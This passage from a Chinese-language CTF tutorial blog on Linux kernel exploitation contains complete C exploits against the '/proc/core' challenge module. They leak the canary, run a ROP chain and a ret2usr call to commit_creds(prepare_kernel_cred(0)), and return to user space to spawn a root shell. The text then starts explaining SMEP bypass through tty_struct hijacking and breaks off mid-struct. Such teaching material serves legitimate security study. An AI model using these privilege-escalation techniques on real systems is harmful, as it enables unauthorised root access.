<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">size_t</span> user_cs,user_ss,user_rflags,user_sp;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __asm__(</span><br><span class="line">    <span class="string">"mov user_cs,cs;"</span></span><br><span class="line">    <span class="string">"mov user_ss,ss;"</span></span><br><span class="line">    <span class="string">"mov user_sp,rsp;"</span></span><br><span class="line">    <span class="string">"pushf;"</span></span><br><span class="line">    <span class="string">"pop user_rflags;"</span></span><br><span class="line">  );</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"[*] status has been saved."</span>)</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="调试-1"><a href="#调试-1" class="headerlink" title="调试"></a>调试</h4><p>tips1:ctrl+A再按X可以让qemu退出</p>
<p>使用<code>gdb ./vmlinux -q</code>调试内核，在qemu内部使用<code>cat /sys/module/core/sections/.text</code>查看基址，使用<code>add-symbol-file ./core.ko [text_base]</code>增加符号表，<code>b core_read</code>添加断点，<code>target remote localhost:1234</code>开始调试。</p>
<h4 id="exp-c-1"><a href="#exp-c-1" class="headerlink" title="exp.c"></a>exp.c</h4><p>最后在构造rop的时候的栈结构是<br>p_rdi<br>0<br>prepare_kernel_cred<br>mov rdi, rax<br>commit_creds<br>但是gadgets里没有直接能用的<code>mov rdi, rax; ret;</code>所以这里迂回了一下。构造的结构是：<br>p_rdi<br>0<br>prepare_kernel_cred<br>p_rdx_ret<br>p_rcx_ret<br>mov rdi, rax; call rdx;<br>commit_creds<br>注意写exp之前要先sava_status,在 64 位系统中执行 iretq 指令前需要执行一下 swapgs 指令，该指令将 gs 寄存器的值与 MSR 地址 中的值交换。在内核态常规操作（如系统调用）的入口处，执行 swapgs 指令获得指向内核数据结构的指针，那么对应的， 从内核态退出，返回到用户态时也需执行一下 swapgs<br>iretq用来恢复用户空间，需要给出之前保存的寄存器的值。恢复到用户空间之后一个<code>ret</code>到我们的<code>system(&quot;/bin/sh&quot;)</code>即可起root shell。</p>
<p>还有一个有意思的地方在于我们明明是在write里泄露的canary，在copy函数里进行的栈溢出，但是canary和栈布局都是一样的，而且在gdb中看到的输入地址距离rbp相去甚远，实际上却恰如其分。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs,user_ss,user_rflags,user_sp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> commit_creds=<span class="number">0</span>,prepare_kernel_cred=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> vmlinux_base;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __asm__(</span><br><span class="line">    <span class="string">"mov user_cs,cs;"</span></span><br><span class="line">    <span class="string">"mov user_ss,ss;"</span></span><br><span class="line">    <span class="string">"mov user_sp,rsp;"</span></span><br><span class="line">    <span class="string">"pushf;"</span></span><br><span class="line">    <span class="string">"pop user_rflags;"</span></span><br><span class="line">  );</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"[*] status has been saved."</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">GetRootShell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!getuid())&#123;</span><br><span class="line">        system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[*] get root shell error!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">FindVmlinuxBase</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd = fopen(<span class="string">"/tmp/kallsyms"</span>,<span class="string">"r"</span>);</span><br><span class="line">    <span class="keyword">if</span>(fd == <span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[*]open symbol file failed."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">while</span>(fgets(buf,<span class="number">0x30</span>,fd))&#123;</span><br><span class="line">        <span class="keyword">if</span>(commit_creds &amp;&amp; prepare_kernel_cred)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf,<span class="string">"commit_creds"</span>) &amp;&amp; !commit_creds)&#123;</span><br><span class="line">            <span class="keyword">char</span> hex[<span class="number">0x20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex,buf,<span class="number">0x10</span>);</span><br><span class="line">            <span class="built_in">sscanf</span>(hex,<span class="string">"%llx"</span>,&amp;commit_creds);</span><br><span class="line">            vmlinux_base = commit_creds - <span class="number">0x9c8e0</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"[*]vmlinux base =&gt; %llx\n"</span>,vmlinux_base);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf,<span class="string">"prepare_kernel_cred"</span>) &amp;&amp; !prepare_kernel_cred)&#123;</span><br><span class="line">            <span class="keyword">char</span> hex[<span class="number">0x20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex,buf,<span class="number">0x10</span>);</span><br><span class="line">            <span class="built_in">sscanf</span>(hex,<span class="string">"%llx"</span>,&amp;prepare_kernel_cred);</span><br><span class="line">            vmlinux_base = prepare_kernel_cred - <span class="number">0x9cce0</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"[*]vmlinux base =&gt; %llx\n"</span>,vmlinux_base);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> raw_vmlinux_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    save_status();</span><br><span class="line">    FindVmlinuxBase();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*]prepare_kernel_cred addr:%p\n"</span>,prepare_kernel_cred);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*]commit_creds addr:%p\n"</span>,commit_creds);</span><br><span class="line">    <span class="comment">//leak sth</span></span><br><span class="line">    <span class="keyword">int</span> core_fd = open(<span class="string">"/proc/core"</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">char</span>* user_buf = (<span class="keyword">char</span>*)<span class="built_in">malloc</span>(<span class="number">0x50</span>*<span class="keyword">sizeof</span>(<span class="keyword">char</span>));</span><br><span class="line">    <span class="built_in">memset</span>(user_buf,<span class="number">0</span>,<span class="keyword">sizeof</span>(<span class="keyword">char</span>)*<span class="number">0x50</span>);</span><br><span class="line">    <span class="comment">//set off=0x40</span></span><br><span class="line">    ioctl(core_fd,<span class="number">0x6677889C</span>,<span class="number">0x40</span>);</span><br><span class="line">    <span class="comment">//read to user_buf</span></span><br><span class="line">    ioctl(core_fd,<span class="number">0x6677889B</span>,user_buf);</span><br><span class="line">    <span class="keyword">size_t</span> canary = ((<span class="keyword">size_t</span>*)user_buf)[<span class="number">0</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*]leaked canary:%p"</span>,canary);</span><br><span class="line">    <span class="comment">//rops</span></span><br><span class="line">    <span class="keyword">size_t</span> rop[<span class="number">0x1000</span>];</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">size_t</span> offset = vmlinux_base - raw_vmlinux_base;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)</span><br><span class="line">        rop[i] = canary;</span><br><span class="line">	rop[i++] = <span class="number">0xffffffff81000b2f</span> + offset; <span class="comment">// pop rdi; ret</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*]p_rdi addr:%p\n"</span>,<span class="number">0xffffffff81000b2f</span>+offset);</span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line">    rop[i++] = prepare_kernel_cred;         <span class="comment">// prepare_kernel_cred(0)</span></span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff810a0f49</span> + offset; <span class="comment">// pop rdx; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81021e53</span> + offset; <span class="comment">// pop rcx; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff8101aa6a</span> + offset; <span class="comment">// mov rdi, rax; call rdx; </span></span><br><span class="line">    rop[i++] = commit_creds;</span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81a012da</span> + offset; <span class="comment">// swapgs; popfq; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81050ac2</span> + offset; <span class="comment">// iretq; ret; </span></span><br><span class="line"></span><br><span class="line">    rop[i++] = (<span class="keyword">size_t</span>)GetRootShell;         <span class="comment">// rip </span></span><br><span class="line"></span><br><span class="line">    rop[i++] = user_cs;</span><br><span class="line">    rop[i++] = user_rflags;</span><br><span class="line">    rop[i++] = user_sp;</span><br><span class="line">    rop[i++] = user_ss;</span><br><span class="line"></span><br><span class="line">    write(core_fd, rop, <span class="number">0x800</span>);</span><br><span class="line">    ioctl(core_fd, <span class="number">0x6677889a</span>,<span class="number">0xffffffffffff0000</span> | (<span class="number">0x100</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="ret2usr"><a href="#ret2usr" class="headerlink" title="ret2usr"></a>ret2usr</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>利用的是内核态位于ring 0，可以执行用户态的函数，我们不必自己构造调用链，而可以直接在用户态构造好我们需要的函数，在内核rop的时候直接调用即可，当然这些函数用户态是没有的，我们还是得先泄露出来。exp编写如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs,user_ss,user_rflags,user_sp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> commit_creds=<span class="number">0</span>,prepare_kernel_cred=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> vmlinux_base;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __asm__(</span><br><span class="line">    <span class="string">"mov user_cs,cs;"</span></span><br><span class="line">    <span class="string">"mov user_ss,ss;"</span></span><br><span class="line">    <span class="string">"mov user_sp,rsp;"</span></span><br><span class="line">    <span class="string">"pushf;"</span></span><br><span class="line">    <span class="string">"pop user_rflags;"</span></span><br><span class="line">  );</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"[*] status has been saved."</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">BeRoot</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* (*fun1)(<span class="keyword">int</span>) = prepare_kernel_cred;</span><br><span class="line">    <span class="keyword">void</span>  (*fun2)(<span class="keyword">char</span>*) = commit_creds;</span><br><span class="line">    (*fun2)((*fun1)(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">GetRootShell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!getuid())&#123;</span><br><span class="line">        system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[*] get root shell error!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">FindVmlinuxBase</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd = fopen(<span class="string">"/tmp/kallsyms"</span>,<span class="string">"r"</span>);</span><br><span class="line">    <span class="keyword">if</span>(fd == <span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[*]open symbol file failed."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">while</span>(fgets(buf,<span class="number">0x30</span>,fd))&#123;</span><br><span class="line">        <span class="keyword">if</span>(commit_creds &amp;&amp; prepare_kernel_cred)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf,<span class="string">"commit_creds"</span>) &amp;&amp; !commit_creds)&#123;</span><br><span class="line">            <span class="keyword">char</span> hex[<span class="number">0x20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex,buf,<span class="number">0x10</span>);</span><br><span class="line">            <span class="built_in">sscanf</span>(hex,<span class="string">"%llx"</span>,&amp;commit_creds);</span><br><span class="line">            vmlinux_base = commit_creds - <span class="number">0x9c8e0</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"[*]vmlinux base =&gt; %llx\n"</span>,vmlinux_base);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf,<span class="string">"prepare_kernel_cred"</span>) &amp;&amp; !prepare_kernel_cred)&#123;</span><br><span class="line">            <span class="keyword">char</span> hex[<span class="number">0x20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex,buf,<span class="number">0x10</span>);</span><br><span class="line">            <span class="built_in">sscanf</span>(hex,<span class="string">"%llx"</span>,&amp;prepare_kernel_cred);</span><br><span class="line">            vmlinux_base = prepare_kernel_cred - <span class="number">0x9cce0</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"[*]vmlinux base =&gt; %llx\n"</span>,vmlinux_base);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> raw_vmlinux_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    save_status();</span><br><span class="line">    FindVmlinuxBase();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*]prepare_kernel_cred addr:%p\n"</span>,prepare_kernel_cred);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*]commit_creds addr:%p\n"</span>,commit_creds);</span><br><span class="line">    <span class="comment">//leak sth</span></span><br><span class="line">    <span class="keyword">int</span> core_fd = open(<span class="string">"/proc/core"</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">char</span>* user_buf = (<span class="keyword">char</span>*)<span class="built_in">malloc</span>(<span class="number">0x50</span>*<span class="keyword">sizeof</span>(<span class="keyword">char</span>));</span><br><span class="line">    <span class="built_in">memset</span>(user_buf,<span class="number">0</span>,<span class="keyword">sizeof</span>(<span class="keyword">char</span>)*<span class="number">0x50</span>);</span><br><span class="line">    <span class="comment">//set off=0x40</span></span><br><span class="line">    ioctl(core_fd,<span class="number">0x6677889C</span>,<span class="number">0x40</span>);</span><br><span class="line">    <span class="comment">//read to user_buf</span></span><br><span class="line">    ioctl(core_fd,<span class="number">0x6677889B</span>,user_buf);</span><br><span class="line">    <span class="keyword">size_t</span> canary = ((<span class="keyword">size_t</span>*)user_buf)[<span class="number">0</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*]leaked canary:%p"</span>,canary);</span><br><span class="line">    <span class="comment">//rops</span></span><br><span class="line">    <span class="keyword">size_t</span> rop[<span class="number">0x1000</span>];</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">size_t</span> offset = vmlinux_base - raw_vmlinux_base;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)</span><br><span class="line">        rop[i] = canary;</span><br><span class="line">    rop[i++] = BeRoot;</span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81a012da</span> + offset; <span class="comment">// swapgs; popfq; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81050ac2</span> + offset; <span class="comment">// iretq; ret; </span></span><br><span class="line"></span><br><span class="line">    rop[i++] = (<span class="keyword">size_t</span>)GetRootShell;         <span class="comment">// rip </span></span><br><span class="line"></span><br><span class="line">    rop[i++] = user_cs;</span><br><span class="line">    rop[i++] = user_rflags;</span><br><span class="line">    rop[i++] = user_sp;</span><br><span class="line">    rop[i++] = user_ss;</span><br><span class="line"></span><br><span class="line">    write(core_fd, rop, <span class="number">0x800</span>);</span><br><span class="line">    ioctl(core_fd, <span class="number">0x6677889a</span>,<span class="number">0xffffffffffff0000</span> | (<span class="number">0x100</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="bypass-smep"><a href="#bypass-smep" class="headerlink" title="bypass smep"></a>bypass smep</h2><h3 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h3><p>smep保护其实就是为了防止ret2usr这样的攻击，是否开启这个保护取决于rc4寄存器的值，我们一般只需要给它改成一个固定值0x6f0就可以关闭它，这里用之前Kernel UAF的babydriver进行演示</p>
<h3 id="CISCN2017-BabyDriver"><a href="#CISCN2017-BabyDriver" class="headerlink" title="CISCN2017-BabyDriver"></a>CISCN2017-BabyDriver</h3><h4 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>这里我们选择一个tty_struct结构体进行操作，在<code>open(&quot;/dev/ptmx&quot;,O_RDWR);</code>的时候会分配这样一个结构体，其源码如下：</p>
<p>其中<code>tty_operations</code>结构体有许多函数指针，我们可以通过伪造fake operation来劫持控制流。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> magic;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kref</span> <span class="title">kref</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">device</span> *<span class="title">dev</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>;</span></span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">    <span class="keyword">int</span> index;</span><br><span class="line">    <span class="comment">/* Protects ldisc changes: Lock tty not pty */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ld_semaphore</span> <span class="title">ldisc_sem</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_ldisc</span> *<span class="title">ldisc</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">atomic_write_lock</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">legacy_mutex</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">throttle_mutex</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rw_semaphore</span> <span class="title">termios_rwsem</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">winsize_mutex</span>;</span></span><br><span class="line">    <span class="keyword">spinlock_t</span> ctrl_lock;</span><br><span class="line">    <span class="keyword">spinlock_t</span> flow_lock;</span><br><span class="line">    <span class="comment">/* Termios values are protected by the termios rwsem */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ktermios</span> <span class="title">termios</span>, <span class="title">termios_locked</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">termiox</span> *<span class="title">termiox</span>;</span>    <span class="comment">/* May be NULL for unsupported */</span></span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">64</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">pgrp</span>;</span>       <span class="comment">/* Protected by ctrl lock */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">session</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> flags;</span><br><span class="line">    <span class="keyword">int</span> count;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">winsize</span> <span class="title">winsize</span>;</span>     <span class="comment">/* winsize_mutex */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> stopped:<span class="number">1</span>,    <span class="comment">/* flow_lock */</span></span><br><span class="line">              flow_stopped:<span class="number">1</span>,</span><br><span class="line">              unused:BITS_PER_LONG - <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">int</span> hw_stopped;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> ctrl_status:<span class="number">8</span>,    <span class="comment">/* ctrl_lock */</span></span><br><span class="line">              packet:<span class="number">1</span>,</span><br><span class="line">              unused_ctrl:BITS_PER_LONG - <span class="number">9</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> receive_room;  <span class="comment">/* Bytes free for queue */</span></span><br><span class="line">    <span class="keyword">int</span> flow_change;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> *<span class="title">link</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync</span>;</span></span><br><span class="line">    <span class="keyword">wait_queue_head_t</span> write_wait;</span><br><span class="line">    <span class="keyword">wait_queue_head_t</span> read_wait;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">hangup_work</span>;</span></span><br><span class="line">    <span class="keyword">void</span> *disc_data;</span><br><span class="line">    <span class="keyword">void</span> *driver_data;</span><br><span class="line">    <span class="keyword">spinlock_t</span> files_lock;      <span class="comment">/* protects tty_files list */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">tty_files</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N_TTY_BUF_SIZE 4096</span></span><br><span class="line">    <span class="keyword">int</span> closing;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> *write_buf;</span><br><span class="line">    <span class="keyword">int</span> write_cnt;</span><br><span class="line">    <span class="comment">/* If the tty has a pending do_SAK, queue it here - akpm */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">SAK_work</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_port</span> *<span class="title">port</span>;</span></span><br><span class="line">&#125; __randomize_layout;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> * (*<span class="title">lookup</span>)(<span class="title">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>,</span></span><br><span class="line"><span class="class">            <span class="title">struct</span> <span class="title">file</span> *<span class="title">filp</span>, <span class="title">int</span> <span class="title">idx</span>);</span></span><br><span class="line">    <span class="keyword">int</span>  (*install)(struct tty_driver *driver, struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*remove)(struct tty_driver *driver, struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*open)(struct tty_struct * tty, struct file * filp);</span><br><span class="line">    <span class="keyword">void</span> (*close)(struct tty_struct * tty, struct file * filp);</span><br><span class="line">    <span class="keyword">void</span> (*shutdown)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*cleanup)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*write)(struct tty_struct * tty,</span><br><span class="line">              <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *buf, <span class="keyword">int</span> count);</span><br><span class="line">    <span class="keyword">int</span>  (*put_char)(struct tty_struct *tty, <span class="keyword">unsigned</span> <span class="keyword">char</span> ch);</span><br><span class="line">    <span class="keyword">void</span> (*flush_chars)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*write_room)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*chars_in_buffer)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*ioctl)(struct tty_struct *tty,</span><br><span class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg);</span><br><span class="line">    <span class="keyword">long</span> (*compat_ioctl)(struct tty_struct *tty,</span><br><span class="line">                 <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg);</span><br><span class="line">    <span class="keyword">void</span> (*set_termios)(struct tty_struct *tty, struct ktermios * old);</span><br><span class="line">    <span class="keyword">void</span> (*throttle)(struct tty_struct * tty);</span><br><span class="line">    <span class="keyword">void</span> (*unthrottle)(struct tty_struct * tty);</span><br><span class="line">    <span class="keyword">void</span> (*stop)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*start)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*hangup)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span> (*break_ctl)(struct tty_struct *tty, <span class="keyword">int</span> state);</span><br><span class="line">    <span class="keyword">void</span> (*flush_buffer)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*set_ldisc)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*wait_until_sent)(struct tty_struct *tty, <span class="keyword">int</span> timeout);</span><br><span class="line">    <span class="keyword">void</span> (*send_xchar)(struct tty_struct *tty, <span class="keyword">char</span> ch);</span><br><span class="line">    <span class="keyword">int</span> (*tiocmget)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span> (*tiocmset)(struct tty_struct *tty,</span><br><span class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="built_in">set</span>, <span class="keyword">unsigned</span> <span 